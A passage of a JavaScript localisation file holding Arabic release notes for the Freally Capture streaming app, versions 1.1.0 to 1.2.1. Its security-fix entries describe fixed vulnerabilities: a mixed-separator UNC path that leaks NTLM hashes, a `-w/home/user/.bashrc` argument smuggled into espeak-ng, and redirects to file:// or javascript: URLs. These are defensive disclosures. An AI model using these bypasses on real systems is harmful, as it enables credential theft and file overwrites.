(function (all) { var mine = all["ar"] = all["ar"] || {}; var add = {"changelog.55f272992501":"ستُوثَّق في هذا الملف جميع التغييرات الجديرة بالذكر في Freally Capture.","changelog.34cd2e6013c5":"يستند التنسيق إلى <a href=\"https://keepachangelog.com/en/1.1.0/\">Keep a Changelog</a>، ويسعى هذا المشروع إلى الالتزام بـ<a href=\"https://semver.org/spec/v2.0.0.html\">الإصدار الدلالي</a>.","changelog.b6512e169100":"<strong>الحالة: مستقر.</strong> أكمل <strong>1.0.0</strong> خريطة الطريق المؤلفة من 100 ميزة معدودة (جميع ميزات CAP-M الأساسية الـ26 + جميع ميزات CAP-N التكميلية الـ74) إضافةً إلى ميزات الصقل الخمس الخاصة بالإطلاق. وأضاف <strong>1.1.0</strong> ميزة التصدير التلقائي المستحقة منذ Build 12، ويضيف <strong>1.2.0</strong> الميزات الثلاث الأخيرة: الكاميرا الافتراضية، ومصدر متصفح حقيقي، والتقاط الألعاب. أما <strong>1.2.1</strong> فهو تدقيق Operation_Optimization: لا ميزات جديدة، بل مراجعة شاملة لقاعدة الشيفرة كلها من حيث الأمان والصحة — وأصبحت إضافات 1.2.0 الثلاث الآن قابلة للوصول وتعمل فعلًا. يوثّق السلّم أدناه كيف وصل التطبيق إلى هنا، بدءًا من الحد الأدنى للمنتج (MVP) للاستوديو في 0.70.0 صعودًا.","changelog.bd0bded7ecb3":"[1.2.1] — 2026-08-20 (Operation_Optimization — تدقيق وتحصين وإتاحة الوصول)","changelog.52c9ccef246a":"<strong>تدقيق شامل لقاعدة الشيفرة كلها، والإصلاحات التي كشف عنها.</strong> مرّ كل قسم من أقسام التطبيق — نحو 147 ألف سطر موزعة على 13 قسمًا — عبر <code>/simplify</code> و<code>/security-review</code> و<code>/code-review</code>. لم يُضَف شيء جديد. ما تغيّر هو أن عدة أمور <em>شُحنت</em> في 1.2.0 باتت الآن <strong>تعمل</strong> فعلًا: لم يكن التقاط الألعاب يصل إلى أي عنوان حديث، ولم يكن من الممكن تشغيل الكاميرا الافتراضية إطلاقًا، وكان مصدر المتصفح مخفيًا من القائمة. وإلى جانب ذلك، كان من الممكن تجاوز حارس مسارات تعتمد عليه جميع الحراس الأخرى في التطبيق بحرف واحد.","changelog.b16452720739":"أُصلح — الأمان","changelog.d62edfd54f4e":"<strong>أغفل حارس مسارات الشبكة صيغتَي UNC يقبلهما Windows.</strong> كانت <code>is_remote</code> تختبر <code>\\\\</code> و<code>//</code> لكنها لا تختبر <code>/\\</code> أو <code>\\/</code>، بينما يعامل Win32 الفاصلين على أنهما متبادلان في تلك البادئة المكوّنة من حرفين — إذ إن <code>GetFullPath(&quot;/\\localhost\\C$\\Windows&quot;)</code> يُحلَّل فعلًا إلى <code>\\\\localhost\\C$\\Windows</code>. ولأن هذا الشرط الوحيد يقف وراء <em>كل</em> فحص للمسارات في التطبيق (التسجيلات، وكشف المجلدات، واستيراد الحزم، وخط الأنابيب، والأتمتة، وستة حراس في الاستوديو)، فإن استبدال حرف واحد كان يصل إلى اتصال SMB حقيقي ويسرّب تجزئة بيانات اعتماد NTLM إلى مضيف يحدده المهاجم. أصبح الآن يوحّد الفاصلين كليهما ويحذف المسافات البيضاء البادئة.","changelog.57f43b5bfb70":"<strong>كان حقن التقاط الألعاب يثق بمعرّف عملية (pid) ربما أُعيد استخدامه.</strong> كانت <code>inject()</code> تتحقق من الموافقة مقابل اسم الملف التنفيذي الذي مرّره <em>المستدعي</em>، ولم تتحقق قط مقابل العملية التي فتحتها فعلًا — ويعيد Windows تدوير معرّفات العمليات بشراسة بين البحث عن النافذة واستدعاء <code>OpenProcess</code>. أصبحت الآن تستعلم عن اسم الصورة من المقبض المفتوح وتعيد التحقق من الموافقة قبل <code>CreateRemoteThread</code>.","changelog.14fb39bd677f":"<strong>كان WHIP يقبل <code>http://</code>.</strong> في WHIP، مفتاح البث <em>هو</em> رمز الحامل (bearer token)، لذا كانت نقطة النهاية غير المشفّرة ترسل بيانات الاعتماد عبر الشبكة نصًا صريحًا عند كل إعادة اتصال. <code>https</code> فقط.","changelog.e53e8143a9a0":"<strong>كان <code>espeak-ng</code> يفتقد <code>--</code> قبل نص المستخدم</strong> (وكان فرع <code>spd-say</code> يتضمنه بالفعل)، لذا كان سطر في جهاز التلقين مثل <code>-w/home/user/.bashrc</code> يجعله يكتب ملف WAV فوق ذلك الملف.","changelog.27867a99df1e":"<strong>كانت قاعدة NDI «المسارات المطلقة فقط» مجرد <code>debug_assert!</code></strong> — تُستبعد عند ترجمة إصدار الشحن، مما ترك متغير بيئة قابلًا للكتابة من المستخدم قادرًا على توجيه <code>LoadLibraryW</code> إلى مسار نسبي.","changelog.e7e404533641":"<strong>نُقل رمز دعوة الضيف البعيد من سلسلة الاستعلام</strong> إلى جزء المعرّف (fragment) في عنوان URL، فلم يعد يصل إلى سجلات الوصول في Pages أو سجل المتصفح أو ترويسة <code>Referer</code> عابرة للأصول.","changelog.db73bbe95da1":"<strong>أصبحت عبارة مرور استقبال SRT مُقنَّعة</strong>، شأنها شأن كل حقل سري آخر في التطبيق.","changelog.e6d73277285d":"أُصلح — الأعطال والصحة","changelog.66b4f9443b67":"<strong>كان من الممكن أن يدخل المُركِّب في حالة panic على خيط العرض.</strong> كان يمسح ذاكرة التخزين المؤقت لخطوط مظللات المستخدم بالكامل في منتصف الإطار بينما لا يزال <code>compose_scene</code> يحتفظ بخطط تشير إليها، ثم يستدعي <code>.expect()</code> — وكان ذلك ممكن الحدوث بفلترَي مظللات وتحرير مباشر عادي، لأن كل ضغطة مفتاح في محرر المظللات تولّد تجزئة جديدة. أصبحت عمليات البحث الآن قابلة للفشل بأمان، ولا يُخرج الإخلاء إلا عمليات الترجمة الفاشلة.","changelog.b9e2ec0e1165":"<strong>لم يكن هناك معالج مثبَّت لأخطاء wgpu غير الملتقطة</strong>، لذا كان أي خطأ تحقق أو نفاد ذاكرة في أي مكان من المُركِّب يسبب panic للعملية. أصبح الخطأ الآن يُسجَّل، مع إسقاط الإطار.","changelog.b8bd5c6887ba":"<strong>كانت المجموعات المخفية تظهر على الهواء أثناء انتقالات النقل (Move)</strong> — فكل مسارات التركيب الأخرى تحترم <code>group_hides</code>؛ أما مسار التحوّل فلم يكن يحترمه، لذا كانت العناصر المخفية تُسجَّل وتُبث طوال مدة الانتقال.","changelog.a87472f8edb5":"<strong>أصبح البث والإعادة يرفضان الإطار ذا الحجم الخاطئ.</strong> يمكن أن تتغير اللوحة في منتصف الجلسة، والمُرمِّزات تُغذّى بإطارات خام ثابتة الحجم، لذا كان مخزن مؤقت واحد بحجم خاطئ يُفقد تدفق البايتات تزامنه لبقية البث بينما تظل الحالة تشير إلى «مباشر».","changelog.42b801d420c3":"<strong>لم يكن هناك تعافٍ من نقص بيانات الصوت (underrun).</strong> فما إن يُستنزف المخزن المسبق البالغ 30 ms حتى تصبح كل كتلة لاحقة كتلةً جزئية موصولة بصمت — طقطقة مستمرة بدلًا من خلل واحد.","changelog.b31061525f09":"لم تعد معرّفات العناصر المكررة تفهرس متجاوزةً ذاكرة التخزين المؤقت لسلسلة الفلاتر؛ ومدة التلاشي التي تساوي NaN تتخطى الفلتر بدلًا من إخفاء المصدر إلى الأبد؛ وتُرفض صور الأقنعة كبيرة الحجم بدلًا من التسبب في panic لـ wgpu؛ واكتسبت <code>fader_gain</code> حارس <code>is_finite</code> الذي كان لدى نظيرتها بالفعل (فقيمة NaN هناك تلتصق وتُفسد بشكل دائم المزيج الرئيسي وLUFS والتسجيل).","changelog.c77e993871b2":"أُصلح — التقاط الألعاب CAP-N78 يعمل الآن مع العناوين الحديثة","changelog.9f9efaee9c7f":"<strong>كان الخطّاف مثبتًا على <code>IDXGISwapChain::Present</code> وحده.</strong> ألعاب DXGI 1.2+ ذات <strong>نموذج القلب (flip-model)</strong> — وهي معظم ما يعمل في وضع ملء الشاشة الحصري — تعرض عبر <code>Present1</code> ولا تلمس تلك الخانة أبدًا، لذا كان الحقن يُبلغ بالنجاح ولا يصل إطار واحد قط. أصبحت الخانتان كلتاهما مخطوفتين الآن، ويغطي ذلك اختبار شامل من البداية إلى النهاية يبني سلسلة تبديل حقيقية بنموذج القلب، ويعرض عبر <code>Present1</code> فقط، ثم يقرأ الإطار الملتقط.","changelog.77d8a35def9c":"<strong>أصبحت حالة فقدان الجهاز (device-lost) مُعالَجة.</strong> يسجّل النسيج المشترك الجهاز الذي أنشأه، لذا فإن TDR أو الخروج بـ alt-tab من ملء الشاشة الحصري يؤدي إلى إعادة البناء بدلًا من النسخ بين جهازين.","changelog.b122bc48cff9":"<strong>لم تعد سلاسل التبديل المتعددة تُرهق النسيج المشترك</strong> عند كل عرض (كانت نافذة مُشغِّل أو منفذ عرض محرر أو شاشة بداية تفرض إعادة بناء بالدقة الكاملة أكثر من 60 مرة في الثانية)؛ إذ تُثبَّت السلسلة الأولى.","changelog.fda7f3673f30":"<strong>أصبحت المخازن الخلفية متعددة العينات تُحَلّ (resolve)</strong> بدلًا من إفشال <code>CopyResource</code> بصمت.","changelog.b3bac7144e62":"<strong>يُستعاد جدول vtable فعلًا عند إلغاء التحميل</strong> — صراحةً من <code>DLL_PROCESS_DETACH</code>، وفقط إذا كانت الخانات لا تزال تحمل دوالّنا، لذا لا يُزال أبدًا بصمت خطّاف أي طبقة تراكب ثبّتت خطّافها لاحقًا. (كان الادعاء السابق بأن <code>Drop</code> الخاص بـ <code>HookState</code> يفعل ذلك خاطئًا: فـ Rust لا يُسقط المتغيرات الساكنة أبدًا.)","changelog.27986d7f86bc":"<strong>أصبح العنوان المبني على D3D12 يفشل سريعًا وبصدق</strong> بدلًا من استنفاد مهلة الإطار الأول، ولم تعد مكتبة DLL المحقونة تكتب إلى stderr — فاللعبة ذات النظام الفرعي الرسومي (GUI) لا تملك مقبض stderr، ومع <code>panic = &quot;abort&quot;</code> كانت الكتابة الفاشلة تُجهض <em>اللعبة</em> نفسها.","changelog.dd55e1058c26":"لم يعد خيط العرض في اللعبة يتحمل انتظارًا قدره 4 ms على keyed-mutex عند كل عرض.","changelog.3f346cd6bbf4":"أُصلح — صار الوصول إليها ممكنًا أخيرًا","changelog.ef07cd87f669":"<strong>أصبح مصدر المتصفح في قائمة الإضافة.</strong> شُحن مكتملًا في 1.2.0 لكن خلف علم معطَّل، وكانت القائمة لا تزال تطلب من المشغّلين استخدام التقاط نافذة بدلًا منه.","changelog.3ff4af9be26b":"<strong>أصبح بالإمكان تشغيل الكاميرا الافتراضية.</strong> كانت الواجهة الخلفية مكتملة ولم يكن شيء يستدعيها: لم تكن هناك أوامر بدء/إيقاف، وكان الزر معطَّلًا بشكل ثابت في الشيفرة. أصبحت الآن موصولة من البداية إلى النهاية، متفرعةً من قراءة البرنامج <em>الموجودة</em> أصلًا، لذا لا يكلّف تفعيلها سوى عملية نشر إضافية واحدة لكل إطار كان يُقرأ بالفعل. لا تزال غير موقّعة، ولا يزال تمرين حقيقي على Zoom/Meet/Teams مستحقًا.","changelog.01041cd1674e":"تغيّر — الأداء","changelog.ae778ae72eb2":"كانت أربعة مسارات فك ترميز تنسخ الإطار بأكمله في كل إطار؛ وكان المُركِّب يهدم كل نسيج في سلسلة الفلاتر ويعيد بناءه 60 مرة في الثانية (كانت ذاكرة التخزين المؤقت تُقلَّم مع كل تركيب، لكن التركيب يعمل للبرنامج والمعاينة والمخرج الرأسي والمشاهد المتداخلة والصور المصغّرة وأجهزة العرض ونصفَي الانتقال كليهما)؛ وكان تسجيل <code>.frec</code> يُجري استدعاء نظام لكل إطار وينسخ 8 MB قبل الطرح؛ وكان FLZ يخصّص جدولًا بحجم 64 KiB لكل شريحة، وكان مفكّك الترميز يخصّص مخزنًا مؤقتًا ثم ينسخ محتواه فورًا إلى مكان آخر؛ وكانت <code>sanitize</code> تربيعية التعقيد عند كل تحميل واستيراد؛ وكان صندوق بريد الالتقاط يحرّر إطارًا بحجم 8 MB داخل القفل الذي ينتظره مستهلكه.","changelog.8800583b308d":"<strong>أصبحت القيم دون الطبيعية (denormals) في الصوت تُصفَّر.</strong> مع <code>forbid(unsafe_code)</code> لا يكون بت التصفير (flush-to-zero) في MXCSR متاحًا، لذا كانت الشرائط المكتومة تتضاءل إلى نطاق القيم دون الطبيعية وتبقى فيه، بتكلفة تتراوح بين 10 و100 ضعف لكل عينة.","changelog.70947783a47e":"أُضيف — المتانة والأدوات","changelog.cc7a8bef1645":"<strong>حدّ أخطاء (error boundary) في React</strong>، موصول بالغلافين المشتركين (<code>PickerShell</code> الذي تستورده 59 ملفًا، و<code>Panel</code>). كان أي استثناء أثناء العرض يُلغي تركيب الاستوديو بأكمله بينما يواصل جانب Rust الترميز والبث — دون أن يخرج عن الهواء، لكن أعمى وعاجزًا عن الإيقاف. أصبح مربع الحوار المتعطل الآن يحتفظ بزر الإغلاق.","changelog.c7dc2964a7e9":"<strong>كان اختباران من اختبارات الدخان المرئية ينجحان على شاشة فارغة.</strong> كان حجم كلٍّ من <code>11-recordings</code> و<code>19-profiles</code> بالضبط 4,255 بايت: لم تعرّف المحاكاة قط الأوامر التي تقرؤها مربعات الحوار تلك، فأُلغي تركيب التطبيق، ولم تتحقق الحلقة من أي شيء. اكتسبت المحاكاة 16 أمرًا وتجهيزة إعدادات كاملة، وأصبحت الحلقة الآن تتحقق من أن مربع الحوار ظاهر فعلًا.","changelog.e020b3ffc504":"<strong>اختبار التشويش (Fuzzing).</strong> تعمل جولات حتمية بمدخلات مشوّهة لمفكّك ضغط <code>.frec</code> ومحلّل معرّفات الالتقاط ضمن الحزمة العادية على أنظمة التشغيل الثلاثة جميعها، إضافةً إلى أداة <code>cargo-fuzz</code> — 77,625,230 تنفيذًا مقابل <code>flz::decompress_into</code> دون أي انهيار.","changelog.f52e2bae0c8f":"يوثّق <code>docs/local-security-tooling.md</code> الماسحات المحلية فقط التي شُغِّلت (Semgrep: 0 نتائج؛ Trivy: 0 أسرار، 0 عالية/حرجة) ويوضح، بصراحة، لماذا <em>لا</em> تستحق إضافة Miri هنا: فجميع حزم المكتبات الاثنتي عشرة تفرض بالفعل <code>deny(unsafe_code)</code>، والشيفرة غير الآمنة المتبقية هي FFI، التي لا يستطيع Miri تنفيذها.","changelog.30ae102eb166":"[1.2.0] — 2026-08-19 (الالتقاط العميق والويب)","changelog.c240db164d51":"<strong>آخر ثلاث إضافات إلى التطبيق.</strong> الكاميرا الافتراضية، ومصدر متصفح حقيقي، والتقاط الألعاب عبر خطّاف عرض (present-hook) محقون على مستوى GPU. الثلاث كلها تبدأ بـ Windows، مع بيان وضع كل نظام تشغيل بصدق بدلًا من تزييفه. اثنتان منها تشحنان مكوّنات <strong>غير موقّعة رقميًا بعد</strong>، ولا تزال تمارين السيناريوهات الحية (ظهور الكاميرا في تطبيق اجتماعات؛ الحقن في عنوان محمي) مستحقة — ويُشار إلى كلا الأمرين صراحةً في الملاحظات أدناه بدلًا من التستر عليهما.","changelog.6b02e0d363a4":"أُضيف","changelog.15c7060f73c9":"<strong>التقاط لعبة عبر خطّاف عرض محقون على مستوى GPU (CAP-N78، Windows).</strong> يمكن الآن التقاط اللعبة عبر <code>Present</code> الخاص بسلسلة التبديل لديها — للعناوين العاملة بملء الشاشة الحصري التي لا يستطيع التقاط النوافذ عبر WGC الوصول إليها، وبمعدل العرض الأصلي للعبة. وهو <strong>اختياري بصرامة لكل عنوان على حدة</strong>: لا يُحقن شيء حتى تقبل المخاطر الصريحة المتعلقة بمكافحة الغش/برامج مكافحة الفيروسات لتلك اللعبة بعينها (<code>Consent</code> محصور في ملف تنفيذي واحد، لا يُصدر إلا من إقرار صريح — ولا يمكن أبدًا إعادة استخدامه مع لعبة أخرى)، والعنوان الذي يرفض الخطّاف يتراجع إلى التقاط نافذة الموجود مع رسالة صادقة، ولا ينهار أبدًا. المصادر ◂ التقاط لعبة (اقرأ أولًا) ← قبول ← اختيار اللعبة. تُعدّل مكتبة DLL الخاصة بالخطّاف جدول vtable في DXGI فقط، وتنسخ كل مخزن خلفي إلى نسيج مشترك محمي بـ keyed-mutex، وتستعيد جدول vtable عند إلغاء التحميل؛ ويُتخطى الإطار المشغول كي لا تتوقف اللعبة بسببنا أبدًا. تُوجَّه المخازن الخلفية بنطاق HDR إلى WGC (الذي يُجري مُركِّب سطح المكتب تعيين درجات الألوان لها) بدلًا من قراءتها خطأً على أنها 8 بت. حزمة جديدة <code>freally-game-hook</code>؛ والبروتوكول في <code>design/game-hook-protocol.md</code>.","changelog.8a03cfb2c221":"<strong>الكاميرا الافتراضية (CAP-N76، Windows).</strong> يُغذّى البرنامج المُركَّب إلى «Freally Capture Virtual Camera» عبر ناقل ذاكرة مشتركة مزدوج التخزين المؤقت وخالٍ من الأقفال (<code>fcap_stream::vcam::transport</code>) ودورة حياة <code>MFCreateVirtualCamera</code> في Media Foundation (<code>fcap-vcam-win</code>)، التي تُفكّك الجهاز عند الإيقاف <em>وعند</em> الإسقاط (drop) كي لا تبقى كاميرا شبحية عالقة. المصدر المسجَّل لخادم الإطارات هو مكتبة COM DLL حقيقية من نوع <code>IMFMediaSource</code> (<code>freally-vcam-source</code>) تسجّل نفسها لكل مستخدم (دون صلاحيات المسؤول) وتقدّم إطارات التطبيق كتدفق RGB32 — وهو نموذج المكوّنات ذاته، عند الطلب ومُتحقَّق منه بالتجزئة، المستخدم في جسور ffmpeg/CEF. تعرض <code>virtual_camera_status</code> مدى التوفر الفعلي بصدق لواجهة المستخدم؛ وتعمل الكاميرا دون توقيع للمستخدم الحالي، ويبقى التوقيع الرقمي للشيفرة الخطوة الوحيدة المرهونة بالإصدار. أما macOS (CoreMediaIO) وLinux (v4l2loopback) فلكلٍّ منهما مكوّنه الخاص.","changelog.7f566bdedc82":"<strong>مصدر متصفح حقيقي — واجهة خلفية CEF OSR (CAP-N77).</strong> تُعرض أي صفحة http/https خارج الشاشة عبر CEF بالدقة/معدل fps المختارين، وتُبث إلى المُركِّب على شكل <code>FBH1</code> + إطارات ثابتة الحجم. تربط الواجهة الخلفية (<code>crates/browser-host --features cef</code>) مكتبة libcef من مكوّن CEF المثبَّت الإصدار والمُتحقَّق منه بالتجزئة، وتمرّر <strong>كل</strong> عملية تنقّل عبر قائمة السماح المشتركة (أي إعادة توجيه إلى <code>file://</code>/<code>javascript:</code> تُلغى ولا تُتَّبع أبدًا). جرى التحقق منه من البداية إلى النهاية على Windows: يُعرض عنوان URL حي إلى إطارات حقيقية مع إيقاف نظيف عند وصول stdin إلى EOF. يُجلب وقت التشغيل عند أول استخدام فقط (لا يُضمَّن أبدًا)؛ والتوقيع الرقمي للشيفرة لكل نظام تشغيل هو خطوة الإصدار المتبقية.","changelog.8f6fb4eb7f42":"الأمان","changelog.2e30d476c4fe":"<strong>أصبح مصدر المتصفح يشغّل وضع الحماية (sandbox) لمُصيِّر Chromium على Windows.</strong> يعرض المضيف صفحات ويب عشوائية، وقد تصل إحداها من مجموعة مشاهد مستوردة، ومع ذلك كان يشغّل Chromium سابقًا ووضع الحماية مُعطَّل — وهو الضابط الوحيد الذي يمنع صفحة مخترقة من التحول إلى تنفيذ شيفرة بصلاحياتك. أصبح Windows الآن يعمل ضمن وضع الحماية. يبقى macOS وLinux دون وضع حماية في الوقت الحالي (إذ يحتاج وضع الحماية في Linux إلى مساعد ذي صلاحيات مرتفعة لا يشحنه المكوّن بعد)، وهذا مذكور صراحةً في الشيفرة بدلًا من تركه يبدو مقصودًا.","changelog.17f0a576df73":"<strong>لم تعد موافقة التقاط لعبة تنتقل ضمن مجموعة المشاهد.</strong> المجموعة مستند قابل للمشاركة — <code>.fcappack</code>، أو استيراد من OBS، أو لقطة، أو ملف معدَّل يدويًا — لذا يجب ألا تتمكن أبدًا من حمل صلاحية حقن DLL في عملية أخرى. لكنها كانت تستطيع ذلك سابقًا: كان علم «أقبل مخاطر مكافحة الغش» حقلًا في المستند، وكانت الحزمة المستلمة التي يسمّي مصدر التقاط لعبة فيها أي ملف تنفيذي تحقن فيه عند الاستيراد، دون أي مطالبة ودون أن يُعرض نص المخاطر أبدًا. أصبح تحميل المجموعة الآن يمسح ذلك العلم دائمًا (ويغطي ذلك اختبار انحدار)، لذا يتراجع التخطيط المستورد إلى التقاط نافذة العادي حتى يوافق المشغّل مجددًا عبر أداة الاختيار — وهي المكان الوحيد الذي يُعرض فيه التحذير فعلًا.","changelog.5d0d9a1170f9":"<strong>أصبحت الموافقة الآن مرتبطة بالملف التنفيذي الذي وافق عليه المستخدم فعلًا.</strong> كانت تُصدر من الملف التنفيذي الذي يُحدَّد وقت البدء ثم يُتحقق منها مقابل السلسلة النصية ذاتها، لذا لم يكن من الممكن أن يفشل الفحص أبدًا، ولم يكن الضمان الموثَّق «لا يمكن أبدًا إعادة استخدام الموافقة على <code>game-a.exe</code> مع <code>game-b.exe</code>» موجودًا وقت التشغيل. تُمنح الموافقة الآن للبرنامج المسجَّل عند اختيار المصدر، ويُتحقق منها مقابل البرنامج الذي تُحيل إليه النافذة الآن، لذا يُرفض المصدر الذي يُعاد ربطه بعملية مختلفة بدلًا من الحقن فيها.","changelog.4118fb4fed0e":"أُزيل","changelog.a76a693b9e23":"<strong>تكامل Freally Central («المزيد من تطبيقات Freally»).</strong> لم يعد Freally Central موجودًا، لذا أُزيلت الوحدة الفرعية المضمَّنة <code>vendor/freally-central</code> وكل ما كان يعتمد عليها: تبعية الحزمة <code>freally-central-engine</code> وأوامر Tauri السبعة <code>central_*</code> الخاصة بها، وعنصر القائمة <strong>مساعدة ← المزيد من تطبيقات Freally</strong> ومربع الحوار الخاص به، وجسر السمات <code>fcp-*</code> في اللوحة، والأسماء المستعارة <code>@freally/central-panel</code> في tsconfig/vite، وكتالوجات اللغات المضمَّنة <code>fcp-*</code> التي كانت تُدمج في كل حزمة. لم يعد Capture يعتمد على مستودع لم يعد موجودًا — فالاستنساخ الجديد وسحب CI ينجحان الآن حيث كانت الوحدة الفرعية المفقودة ستُفشلهما.","changelog.1246fc93bca0":"أُصلح","changelog.3e3cbc39c891":"<strong>أصبح مضيف المتصفح يُغلق بنظافة بدلًا من إنهائه قسرًا.</strong> كان المضيف يُشغَّل وstdin الخاص به موجَّه إلى <code>/dev/null</code>، مما جعل إرسال إشارة البروتوكول الموثّقة «إغلاق stdin ← الخروج بالرمز 0» مستحيلًا — فكان كل إيقاف إنهاءً قسريًا يترك العمليات الفرعية الخاصة بـ CEF للعرض/GPU يتيمة. أصبح stdin الآن أنبوبًا حيًا، وإغلاقه يمنح المضيف مهلة سماح محدودة (500 ms) للخروج من تلقاء نفسه قبل إنهائه. هذا الحد مقصود: إذ تنتظر <code>stop()</code> انتهاء المضخة (join)، لذا يقع هذا على مسار المواءمة في الاستوديو ويجب ألا يعطّل أبدًا تبديل المشهد.","changelog.158d17057e90":"<strong>أصبح جالب وقت تشغيل CEF مثبَّتًا على الفرع الذي بُني المضيف عليه.</strong> كان سابقًا يأخذ أي إصدار يصفه <code>index.json</code> بأنه الأحدث. لا يتمتع CEF باستقرار ABI بين الإصدارات الرئيسية، والمضيف يرفض وقت تشغيل لم يُبنَ عليه، لذا كان «الأحدث» قد يستهلك تنزيلًا بحجم ~100 MB لينتهي إلى مصدر متصفح عالق في طريق مسدود. أصبح أحدث إصدار <code>minimal</code> مستقر <em>ضمن</em> الإصدار الرئيسي المثبَّت هو المختار الآن، وهو ما يلتقط مع ذلك تصحيحات أمان Chromium داخل الفرع.","changelog.7416b5a9ae50":"<strong>أصبحت قاعدة http/https فقط تشمل عمليات إعادة التوجيه، لا عنوان URL الأولي وحده.</strong> كان بإمكان صفحة مقدَّمة عبر http أن تعيد التوجيه — بـ 302، أو <code>location.href</code>، أو <code>window.open</code>، أو إطار فرعي — إلى <code>file://</code> وتقرأ ملفات محلية، أو إلى <code>javascript:</code>/<code>data:</code> لتشغيل نص برمجي لم يختره المشغّل قط. قائمة السماح بوابة واحدة مُختبَرة (<code>is_allowed_url</code>) تُلزَم الواجهة الخلفية لـ CEF الآن باستدعائها من معالج التنقل لديها، لذا لا يمكن لقاعدة argv وقاعدة إعادة التوجيه أن تتباعدا.","changelog.d70c33477501":"<strong>أصبح شريط المكوّن في أداة اختيار المتصفح يتابع التثبيت بدلًا من التجمّد عند لحظة الفتح.</strong> كان يقرأ حالة وقت التشغيل مرة واحدة عند التركيب، لذا كان التثبيت من أدوات ← المكوّنات وأداة الاختيار مفتوحة يتركه يقول إن المكوّن مفقود. أصبح الآن يشترك في الحدث <code>cef</code>، ويميّز بين الحالات الأربع: غير مثبَّت، وتثبيت جارٍ بالفعل، وتثبيت فشل (مع سببه)، ومنصة لا ينشر CEF إصدارًا لها — حيث كانت نصيحة «ثبّته من المكوّنات» نصيحة لا يمكن أن تنجح أبدًا.","changelog.de0da2df5676":"<strong>أصبحت واجهة الربط (seam) الخاصة بالواجهة الخلفية CEF في مضيف المتصفح تخضع للفحص (lint) في CI.</strong> لا يُبنى <code>--features cef</code> إلا في مرحلة المكوّن، لذا انجرف إلى حالة تفشل في <code>clippy -D warnings</code> وكانت ستكسر ذلك البناء في أول تشغيل له. أصبح CI الآن يفحص واجهة الربط عند كل دفع (push).","changelog.63e7bdb09d63":"<strong>أصبح التقاط الألعاب يصمد أمام تغيير الحجم أو alt-tab.</strong> كان مقبض النسيج المشترك المسمّى الخاص بالمُنتِج يُنشأ ثم يُهمَل، لذا ظل الاسم مسجَّلًا طوال عمر عملية اللعبة. ثم كان كل تغيير في الأبعاد يحاول إعادة إنشاء النسيج باسم لا يزال موجودًا، فيفشل بـ <code>DXGI_ERROR_NAME_ALREADY_EXISTS</code>، ويتوقف الالتقاط نهائيًا دون إظهار أي شيء. أصبح المقبض الآن مملوكًا ويُغلق، ويُحرَّر النسيج القديم قبل بناء بديله.","changelog.0a3b42e6c8d3":"<strong>لم تعد أول إضافة لمصدر التقاط لعبة تتراجع بصمت إلى التقاط نافذة.</strong> يعود الحقن بمجرد أن يعود <code>LoadLibraryW</code> البعيد، لكن <code>DllMain</code> <em>يُطلق</em> خيط التجهيز فقط — ولا توجد كتلة التحكم حتى يبني ذلك الخيط جهازًا وسلسلة تبديل وهمية. كان التطبيق يرتبط فورًا فيخسر هذا السباق دائمًا. أصبح الآن ينتظر (لمدة محدودة) حتى يتجهّز الخطّاف فعلًا.","changelog.b97f30288a77":"<strong>أصبحت اللعبة المخطوفة التي تُغلق تحرّر المصدر.</strong> لا يُمسح <code>FLAG_PRODUCER_ALIVE</code> أبدًا — فاللعبة التي تُنهى قسرًا أو تنهار لا تشغّل <code>DLL_PROCESS_DETACH</code> أبدًا — لذا كانت كتلة التحكم الأخيرة تبقى والعلم مضبوط، وتظل المضخة تدور على الإطار الأخير إلى الأبد، دون أن تُغلق ودون أن تُطلق الاسترداد التلقائي. أصبح التطبيق الآن يسأل نظام التشغيل عمّا إذا كانت اللعبة لا تزال تعمل.","changelog.8f6e3e5d64ef":"<strong>لم تعد اللعبة البطيئة في تحميل الخطّاف معرّضة لخطر الانهيار.</strong> عند انتهاء مهلة الحقن كانت الصفحة البعيدة تُحرَّر بينما قد يكون <code>LoadLibraryW</code> الخاص باللعبة لا يزال يقرؤها. أصبحت الصفحة الآن لا تُحرَّر إلا بعد أن يثبت خروج ذلك الخيط.","changelog.76d466ce9bcf":"<strong>أصبح بالإمكان إعادة محاولة التجهيز الفاشل.</strong> إذا فشل تعيين كتلة التحكم، كان علم «مثبَّت» يبقى مضبوطًا، فتظل العملية نصف مجهّزة بشكل دائم: محقونة، ولا تنشر أبدًا، وعاجزة عن التعافي. كما أصبحت حالة الخطّاف تُنشر <em>قبل</em> تعديل خانة vtable — إذ كان أي عرض يقع بينهما لا يجد حالة فيعيد <code>S_OK</code> دون التسلسل إلى <code>Present</code> الحقيقي، مبتلعًا بصمت قلب ذلك الإطار.","changelog.1fdb03f5eeaf":"<strong>لم يعد من الممكن إلغاء تحميل مكتبة DLL لمصدر الكاميرا الافتراضية أثناء استخدامها.</strong> كانت <code>DllCanUnloadNow</code> تجيب بـ <code>S_OK</code> دون أي شرط — وهذه الدالة المُصدَّرة <em>هي</em> الطريقة التي يسأل بها COM — لذا كان بإمكان استدعاء <code>CoFreeUnusedLibraries</code> في مضيف خادم الإطارات إلغاء تحميلها بينما لا يزال تطبيق اجتماعات يحتفظ بمصدر الوسائط. أصبحت الآن تُبلغ عن عدد حقيقي للكائنات وأقفال الخادم. كما يكسر <code>Shutdown</code> دورة المراجع القوية بين المصدر↔التدفق التي كانت تسرّب الذاكرة عند كل فتح للكاميرا.","changelog.686194fae62e":"<strong>كانت سلسلتان نصيتان ظاهرتان للمستخدم تحتويان على مسافات زائدة متتالية</strong> أدخلها التفاف الأسطر (خطأ CEF المثبَّت الإصدار في المكوّنات، وتلميح الكاميرا الافتراضية على الأنظمة غير Windows).","changelog.faf05b9b72f7":"[1.1.0] — 2026-07-20 (الالتقاط العميق والويب — المرحلة 10، الشريحة الأولى)","changelog.4eb7f2b2ea1d":"<strong>يبدأ التعمّق لما بعد 1.0.</strong> تفتح المرحلة 10 واجهات الالتقاط الثلاث المؤجلة منذ زمن بوصفها «مراحل مستقلة» — كاميرا افتراضية، ومصدر متصفح حقيقي، والتقاط الألعاب — في بناء مُجدول كما ينبغي. يشحن هذا الإصدار الجزء المكتمل والقائم بذاته: <strong>التصدير التلقائي لنسخة قابلة للمشاركة عند الإيقاف (CAP-N75)</strong>، وهي ميزة خريطة الطريق المستحقة منذ Build 12. أما أوقات تشغيل مصدر المتصفح والكاميرا الافتراضية فهي مراحل فرعية موقّعة/قائمة على المكوّنات تصل في إصدارات لاحقة؛ ولا يظهر منها شيء للمستخدم بعد. كل ما هو جديد يُشحن معطَّلًا افتراضيًا، ويبقى محليًا، ولا يضيف أي اتصال 